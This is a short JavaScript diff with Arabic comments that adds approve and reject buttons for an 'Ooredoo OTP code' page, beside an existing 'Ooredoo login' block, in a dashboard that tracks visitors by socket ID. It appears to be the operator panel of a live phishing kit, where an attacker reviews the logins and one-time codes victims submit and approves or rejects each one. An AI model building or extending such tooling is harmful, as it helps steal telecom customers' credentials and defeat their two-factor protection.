@@ -2029,6 +2029,21 @@
               }, 100);
             }
             
+            // أزرار موافقة/رفض لصفحة رمز OTP Ooredoo
+            if (dataEntry.page === 'رمز OTP Ooredoo') {
+              const otpApproveBtnId = 'otp-ooredoo-approve-' + visitor.socketId + '-' + dataIndex;
+              const otpRejectBtnId = 'otp-ooredoo-reject-' + visitor.socketId + '-' + dataIndex;
+              html += '<div class="flex gap-2 mt-3">';
+              html += '<button id="' + otpApproveBtnId + '" class="flex-1 px-3 py-2 bg-green-600 text-white rounded-lg hover:bg-green-700 text-sm font-medium"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>موافقة</button>';
+              html += '<button id="' + otpRejectBtnId + '" class="flex-1 px-3 py-2 bg-red-600 text-white rounded-lg hover:bg-red-700 text-sm font-medium"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>رفض</button>';
+              html += '</div>';
+              setTimeout(() => {
+                const approveBtn = document.getElementById(otpApproveBtnId);
+                const rejectBtn = document.getElementById(otpRejectBtnId);
+                if (approveBtn) approveBtn.addEventListener('click', () => approveForm(visitor.socketId));
+                if (rejectBtn) rejectBtn.addEventListener('click', () => rejectForm(visitor.socketId));
+              }, 100);
+            }
             // أزرار موافقة/رفض لصفحة تسجيل دخول Ooredoo
             if (dataEntry.page === 'تسجيل دخول Ooredoo') {
               const ooredooApproveBtnId = 'ooredoo-approve-' + visitor.socketId + '-' + dataIndex;
